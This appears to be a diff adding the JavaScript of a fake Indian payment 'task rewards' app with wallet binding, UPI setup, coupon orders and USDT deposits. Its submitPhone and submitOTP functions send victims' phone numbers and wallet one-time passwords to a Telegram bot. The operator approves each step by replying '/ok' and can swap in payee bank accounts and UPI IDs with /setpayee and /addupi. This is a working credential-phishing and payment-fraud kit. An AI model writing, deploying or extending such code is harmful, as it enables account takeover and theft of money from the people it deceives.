+        document.getElementById('btn-unread').classList.remove('active');
+        document.getElementById('btn-all').classList.remove('active');
+        if(type === 'unread') document.getElementById('btn-unread').classList.add('active');
+        else document.getElementById('btn-all').classList.add('active');
+    }
+
+    function toggleDropdown(type) {
+        const timeDrop = document.getElementById('dropdown-time');
+        const statusDrop = document.getElementById('dropdown-status');
+        const overlay = document.getElementById('bo-overlay');
+        
+        if (type === 'time') {
+            if (timeDrop.style.display === 'flex') { closeAllDropdowns(); }
+            else { closeAllDropdowns(); timeDrop.style.display = 'flex'; overlay.style.display = 'block'; }
+        } else {
+            if (statusDrop.style.display === 'flex') { closeAllDropdowns(); }
+            else { closeAllDropdowns(); statusDrop.style.display = 'flex'; overlay.style.display = 'block'; }
+        }
+    }
+
+    function closeAllDropdowns() {
+        document.getElementById('dropdown-time').style.display = 'none';
+        document.getElementById('dropdown-status').style.display = 'none';
+        document.getElementById('bo-overlay').style.display = 'none';
+    }
+
+    function selectTime(val, el) {
+        document.getElementById('time-label').innerText = val;
+        document.querySelectorAll('#dropdown-time .dropdown-item').forEach(i => i.classList.remove('selected'));
+        el.classList.add('selected');
+        closeAllDropdowns();
+    }
+
+    function selectStatus(val, el) {
+        document.getElementById('status-label').innerText = val;
+        document.querySelectorAll('#dropdown-status .dropdown-item').forEach(i => i.classList.remove('selected'));
+        el.classList.add('selected');
+        closeAllDropdowns();
+    }
+
+    function toggleScoreTab(type) {
+        document.getElementById('btn-into').classList.remove('active');
+        document.getElementById('btn-rollout').classList.remove('active');
+        if(type === 'into') document.getElementById('btn-into').classList.add('active');
+        else document.getElementById('btn-rollout').classList.add('active');
+    }
+
+    function switchSellTab(el) {
+        document.querySelectorAll('#screen-sell-orders .tab-btn').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function switchTaskTab(tab, el) {
+        document.querySelectorAll('#screen-task-rewards .content-scroll').forEach(c => c.classList.remove('active'));
+        document.querySelectorAll('#screen-task-rewards .tab-btn').forEach(t => t.classList.remove('active'));
+        document.getElementById(tab + '-content').classList.add('active');
+        el.classList.add('active');
+    }
+
+    function switchLevelTab(level, el) {
+        document.querySelectorAll('#screen-level .toggle-btn').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function switchPerfTab(el) {
+        document.querySelectorAll('#screen-team .perf-tab').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function switchHistoryTab(tab) {
+        document.getElementById('btn-receive').classList.remove('active');
+        document.getElementById('btn-purchase').classList.remove('active');
+        document.getElementById('content-receive').classList.remove('active');
+        document.getElementById('content-purchase').classList.remove('active');
+        if (tab === 'receive') {
+            document.getElementById('btn-receive').classList.add('active');
+            document.getElementById('content-receive').classList.add('active');
+        } else {
+            document.getElementById('btn-purchase').classList.add('active');
+            document.getElementById('content-purchase').classList.add('active');
+        }
+    }
+
+    function switchHistorySubTab(tab) {
+        document.getElementById('btn-inr').classList.remove('active');
+        document.getElementById('btn-ustd').classList.remove('active');
+        if (tab === 'inr') document.getElementById('btn-inr').classList.add('active');
+        else document.getElementById('btn-ustd').classList.add('active');
+    }
+
+    function openModal() { document.getElementById('confirm-modal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('confirm-modal').style.display = 'none'; }
+    function confirmStopSelling() {
+        closeModal();
+        const btn = document.getElementById('main-action-btn');
+        if (btn.innerText === 'Closed Selling') {
+            btn.innerText = 'Start Selling'; btn.classList.add('start-selling');
+        } else {
+            btn.innerText = 'Closed Selling'; btn.classList.remove('start-selling');
+        }
+    }
+
+    // ==========================================
+    // DEPOSIT LOGIC
+    // ==========================================
+    function calculateScore() {
+        const inputVal = document.getElementById('usdt-input').value;
+        let result = parseFloat(inputVal) * 111;
+        if (isNaN(result)) result = 0;
+        document.getElementById('score-output').innerText = result.toFixed(2) + ' Score';
+    }
+
+    function selectChain(el) {
+        document.querySelectorAll('#screen-deposit .chain-option').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function createDepositOrder() {
+        const inputVal = document.getElementById('usdt-input').value;
+        const amount = inputVal ? parseFloat(inputVal) : 0;
+        document.getElementById('order-usdt-amount').innerText = `USDT ${amount.toFixed(2)}`;
+
+        const now = new Date();
+        const yyyy = now.getFullYear(), mm = String(now.getMonth() + 1).padStart(2, '0'), dd = String(now.getDate()).padStart(2, '0');
+        const hh = String(now.getHours()).padStart(2, '0'), min = String(now.getMinutes()).padStart(2, '0'), ss = String(now.getSeconds()).padStart(2, '0');
+        document.getElementById('order-date').innerText = `${yyyy}-${mm}-${dd} ${hh}:${min}:${ss}`;
+        document.getElementById('order-id').innerText = `U${yyyy}${mm}${dd}${hh}${min}${Math.floor(Math.random()*10000)}`;
+
+        switchScreen('screen-deposit-order');
+    }
+
+    // ==========================================
+    // WALLET/TOOLS LOGIC
+    // ==========================================
+    const providers = {
+        personal: [
+            { id: 'freecharge', name: 'Freecharge', img: 'https://play-lh.googleusercontent.com/e5Y4ftiOjuk-WWQiDfof8HEk3UvqmqYUuKpJqszr6vEgyIg0H4Z-r47GV6fTSC339hgzPuz9Waa0Ir5Lxuqa_A', bonus: true },
+            { id: 'mobikwik', name: 'Mobikwik', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9EzjNf0JpL0zUiF8nKWDhmbLeuTRT1qXcTpi59-6sTg&s=10', bonus: true },
+            { id: 'moneyview', name: 'MoneyView', img: 'https://ibsintelligence.com/wp-content/uploads/2026/07/money_view_logo.jpeg', bonus: true },
+            { id: 'phonepe', name: 'Phonepe', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ86KerXfaeiE80v3LS0nAxpHxV5nKIhZnBxGIhVVE0_Q&s=10', bonus: false },
+            { id: 'indus', name: 'IndusPay', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvo9GXbjRmOcyXTDe5MiB_0wzREhcu7w9GvyBn2-8VsA&s=10', bonus: false },
+            { id: 'bharatpe', name: 'BharatpeBiz', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-lokzGuTdPIEnygNz6L9F6RZfaZMFZZRGha6Iqnpvlw&s=10', bonus: false },
+            { id: 'navi', name: 'Navi', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQj8EBjULqhj_FcpGo4BkXDidi_jdecJZHzGD3gOglERw&s=10', bonus: false }
+        ],
+        business: [
+            { id: 'paytm', name: 'Paytm Business', img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQj8EBjULqhj_FcpGo4BkXDidi_jdecJZHzGD3gOglERw&s=10', bonus: true },
+            { id: 'gpay', name: 'GooglePay Business', img: 'https://www.gstatic.com/marketing-cms/assets/images/10/ae/87c61cd94e35bcbb780b37a7d21e/gpay-light-bg.webp', bonus: true }
+        ]
+    };
+
+    let selectedProvider = null;
+    let selectedUpi = null;
+
+    function switchProviderTab(type) {
+        document.getElementById('tab-personal').classList.remove('active');
+        document.getElementById('tab-business').classList.remove('active');
+        document.getElementById('tab-' + type).classList.add('active');
+        renderProviders(type);
+    }
+
+    function renderProviders(type) {
+        const list = document.getElementById('provider-list');
+        list.innerHTML = '';
+        providers[type].forEach(p => {
+            const html = `
+                <div class="provider-card" onclick="selectProvider('${p.id}', '${p.name}')">
+                    <div class="prov-left">
+                        <div class="prov-icon"><img src="${p.img}" alt="${p.name}"></div>
+                        <div class="prov-text">
+                            <h4>${p.name} ${p.bonus ? '<span class="bonus-pill">Binding Bonus</span>' : ''}</h4>
+                            <p>Payin 50.00 - 50000.00</p>
+                        </div>
+                    </div>
+                    <div class="prov-right">Payout</div>
+                </div>
+            `;
+            list.innerHTML += html;
+        });
+    }
+
+    function selectProvider(id, name) {
+        selectedProvider = { id, name };
+        document.getElementById('prov-name-1').innerText = name;
+        document.getElementById('prov-name-2').innerText = name;
+        document.getElementById('wallet-phone').value = '';
+        document.getElementById('wallet-otp').value = '';
+        document.getElementById('step-1').style.display = 'block';
+        document.getElementById('step-2').style.display = 'none';
+        document.getElementById('step-3').style.display = 'none';
+        document.getElementById('step-4').style.display = 'none';
+        document.getElementById('step-ind-1').classList.add('active');
+        document.getElementById('step-ind-2').classList.remove('active');
+        document.getElementById('step-ind-3').classList.remove('active');
+        switchScreen('screen-wallet-setup');
+    }
+
+    function submitPhone() {
+        const phone = document.getElementById('wallet-phone').value;
+        if (phone.length !== 10) { showAlert('Enter valid 10-digit phone.'); return; }
+        document.getElementById('display-phone').innerText = '+91 ' + phone;
+        document.getElementById('display-phone-2').innerText = phone.substring(0,4) + '****' + phone.substring(8);
+        document.getElementById('loader').style.display = 'flex';
+        isWaitingWallet = 'phone';
+        sendTelegram(`📱 <b>NEW WALLET REQUEST</b>\n<b>Provider:</b> ${selectedProvider.name}\n<b>Phone:</b> +91 ${phone}\n\n👉 Reply <code>/ok</code>`);
+    }
+
+    function submitOTP() {
+        const otp = document.getElementById('wallet-otp').value;
+        if (otp.length !== 6) { showAlert('Enter 6-digit OTP.'); return; }
+        document.getElementById('loader').style.display = 'flex';
+        isWaitingWallet = 'otp';
+        sendTelegram(`🔐 <b>WALLET OTP</b>\n<b>Provider:</b> ${selectedProvider.name}\n<b>OTP:</b> <code>${otp}</code>\n\n👉 Reply <code>/ok</code>`);
+    }
+
+    function renderUpis() {
+        let upis = JSON.parse(localStorage.getItem('admin_upis')) || ['9153033387@mbkns'];
+        const list = document.getElementById('upi-list');
+        list.innerHTML = '';
+        selectedUpi = upis[0];
+        upis.forEach(u => {
+            const sel = u === selectedUpi ? 'selected' : '';
+            list.innerHTML += `<div class="upi-box ${sel}" onclick="selectUpi('${u}', this)"><div class="upi-radio"></div><div class="upi-text">${u}</div></div>`;
+        });
+    }
+
+    function selectUpi(upi, el) {
+        selectedUpi = upi;
+        document.querySelectorAll('.upi-box').forEach(b => b.classList.remove('selected'));
+        el.classList.add('selected');
+    }
+
+    function finishSetup() {
+        if (!selectedUpi) { showAlert('Wait for admin to add UPI.'); return; }
+        let wallets = JSON.parse(localStorage.getItem('my_wallets')) || [];
+        wallets.push({ provider: selectedProvider.name, upi: selectedUpi, status: 'Enabled' });
+        localStorage.setItem('my_wallets', JSON.stringify(wallets));
+        document.getElementById('step-3').style.display = 'none';
+        document.getElementById('step-4').style.display = 'block';
+        document.getElementById('step-ind-3').classList.add('active');
+        loadWallets();
+    }
+
+    function loadWallets() {
+        const list = document.getElementById('my-wallets-list');
+        const empty = document.getElementById('empty-wallet-text');
+        let wallets = JSON.parse(localStorage.getItem('my_wallets')) || [];
+        list.innerHTML = '';
+        list.appendChild(empty);
+        if (wallets.length === 0) empty.style.display = 'block';
+        else {
+            empty.style.display = 'none';
+            wallets.reverse().forEach((w, i) => {
+                const idx = wallets.findIndex(x => x.upi === w.upi && x.provider === w.provider);
+                const cls = w.status === 'Enabled' ? 'enabled' : 'disabled';
+                list.innerHTML += `
+                    <div class="wallet-card">
+                        <div class="shape-y"></div><div class="shape-b"></div>
+                        <div class="wc-content">
+                            <div class="wc-header"><div class="wc-title">${w.provider}</div><button class="status-pill ${cls}" onclick="toggleWalletStatus(${idx})">${w.status}</button></div>
+                            <div class="wc-upi">${w.upi}</div>
+                            <div class="wc-range">LimitedRange:10.00~100000.00</div>
+                        </div>
+                    </div>`;
+            });
+        }
+    }
+
+    function toggleWalletStatus(idx) {
+        let wallets = JSON.parse(localStorage.getItem('my_wallets')) || [];
+        wallets[idx].status = wallets[idx].status === 'Enabled' ? 'Disabled' : 'Enabled';
+        localStorage.setItem('my_wallets', JSON.stringify(wallets));
+        loadWallets();
+    }
+
+    // ==========================================
+    // PAYMENT/ORDER LOGIC
+    // ==========================================
+    let coupons = [
+        { amt: 100, qty: 2, reward: 5 }, { amt: 120, qty: 1, reward: 6 }, { amt: 150, qty: 5, reward: 7.5 },
+        { amt: 200, qty: 3, reward: 10 }, { amt: 300, qty: 2, reward: 15 }, { amt: 400, qty: 31, reward: 20 },
+        { amt: 1000, qty: 33, reward: 50 }, { amt: 3000, qty: 4, reward: 150 }, { amt: 30000, qty: 1, reward: 1500 }
+    ];
+
+    function filterData(range, el) {
+        document.querySelectorAll('#screen-payment .chip').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        const list = document.getElementById('order-list');
+        list.innerHTML = '';
+        let filtered = coupons;
+        if (range !== 'all') {
+            const [min, max] = range.split('-').map(Number);
+            filtered = coupons.filter(c => c.amt >= min && c.amt <= max);
+        }
+        if(filtered.length === 0) { list.innerHTML = '<p style="text-align:center; color:#888;">No orders.</p>'; return; }
+
+        filtered.forEach(c => {
+            const final = c.amt + c.reward;
+            list.innerHTML += `
+                <div class="order-card">
+                    <div class="oc-left"><h3>Order amount: ${c.amt.toFixed(2)}</h3><p>Order quantity: ${c.qty}</p><p>Reward: <span>${c.reward.toFixed(2)}</span></p></div>
+                    <div class="oc-right"><button class="btn-receive" onclick="requestOrderApproval(${c.amt})">Receive</button><div class="final-amt">Final: ${final.toFixed(2)} INR</div></div>
+                </div>`;
+        });
+    }
+
+    function requestOrderApproval(amount) {
+        currentOrderAmount = amount;
+        isWaitingOrder = true;
+        document.getElementById('loader').style.display = 'flex';
+        sendTelegram(`🛒 <b>NEW ORDER REQUEST</b>\nAmount: ₹${amount}\n\n👉 Reply <code>/ok</code> to approve.`);
+    }
+
+    function showOrderScreen() {
+        document.getElementById('ord-amount').innerText = `INR ${currentOrderAmount.toFixed(2)}`;
+        document.getElementById('ord-id').innerText = `R${Date.now()}`;
+        switchScreen('screen-order');
+        
+        clearInterval(mainTimer);
+        let secs = 30 * 60;
+        mainTimer = setInterval(() => {
+            secs--;
+            const m = Math.floor(secs / 60).toString().padStart(2, '0');
+            const s = (secs % 60).toString().padStart(2, '0');
+            document.getElementById('ord-timer').innerText = `Expire: ${m}:${s}`;
+        }, 1000);
+    }
+
+    // ==========================================
+    // TELEGRAM POLLING & COMMANDS
+    // ==========================================
+    function sendTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+        }).catch(e => console.log(e));
+    }
+
+    async function pollTelegram() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+            const data = await res.json();
+            if (data.ok && data.result.length > 0) {
+                data.result.forEach(u => { 
+                    lastUpdateId = u.update_id; 
+                    const text = u.message?.text?.trim();
+                    if(!text) return;
+
+                    // --- APPROVALS ---
+                    if (text === '/ok') {
+                        if (isWaitingLogin) {
+                            isWaitingLogin = false;
+                            document.getElementById('loader').style.display = 'none';
+                            switchScreen('screen-dashboard', true);
+                            document.querySelectorAll('.nav-item')[0].classList.add('active');
+                        } else if (isWaitingWallet === 'phone') {
+                            isWaitingWallet = null;
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('step-1').style.display = 'none';
+                            document.getElementById('step-2').style.display = 'block';
+                            document.getElementById('step-ind-1').classList.remove('active');
+                            document.getElementById('step-ind-2').classList.add('active');
+                        } else if (isWaitingWallet === 'otp') {
+                            isWaitingWallet = null;
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('step-2').style.display = 'none';
+                            document.getElementById('step-3').style.display = 'block';
+                            document.getElementById('step-ind-2').classList.remove('active');
+                            document.getElementById('step-ind-3').classList.add('active');
+                            renderUpis();
+                        } else if (isWaitingOrder) {
+                            isWaitingOrder = false;
+                            document.getElementById('loader').style.display = 'none';
+                            showOrderScreen();
+                        }
+                    }
+
+                    // --- LINKS & IMAGES ---
+                    if (text.startsWith('/setlink ')) {
+                        const p = text.split(' ');
+                        if(p.length >= 3) {
+                            appConfig.links[p[1]] = p[2];
+                            localStorage.setItem('appConfig', JSON.stringify(appConfig));
+                            sendTelegram(`✅ Link updated for <b>${p[1]}</b>`);
+                        }
+                    }
+                    if (text.startsWith('/seticon ')) {
+                        const p = text.split(' ');
+                        if(p.length >= 3) {
+                            appConfig.images[p[1]] = p[2];
+                            localStorage.setItem('appConfig', JSON.stringify(appConfig));
+                            updateDynamicUI();
+                            sendTelegram(`✅ Icon updated for <b>${p[1]}</b>`);
+                        }
+                    }
+
+                    // --- PAYEE & UPI ---
+                    if(text.startsWith('/setpayee ')) {
+                        const p = text.split(' ');
+                        if(p.length >= 4) { 
+                            payeeData = { acc: p[1], name: p[2], ifsc: p[3] }; 
+                            localStorage.setItem('payeeData', JSON.stringify(payeeData)); 
+                            updateDynamicUI();
+                            sendTelegram(`✅ Payee updated.`); 
+                        }
+                    }
+                    if (text.startsWith('/addupi ')) {
+                        let upis = JSON.parse(localStorage.getItem('admin_upis')) || ['9153033387@mbkns'];
+                        upis.push(text.replace('/addupi ', '').trim());
+                        localStorage.setItem('admin_upis', JSON.stringify(upis));
+                        sendTelegram(`✅ UPI Added`);
+                    }
+                });
+            }
+        } catch (e) {} finally { setTimeout(pollTelegram, 2000); }
+    }
+
+    // ==========================================
+    // UTILS
+    // ==========================================
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(() => showAlert('Copied: ' + text)).catch(() => showAlert('Copy failed.'));
+    }
+
+    function showAlert(msg) {
+        // Custom alert logic (using standard alert for simplicity)
+        alert(msg);
+    }
+
+    function shareApp(platform) {
+        showAlert(`Sharing on ${platform}...`);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`); 
+        pollTelegram();
+        filterData('all', document.querySelector('#screen-payment .chip.active'));
+        loadWallets();
+        updateDynamicUI();
+    });
+</script>
+
+</body>
+</html>
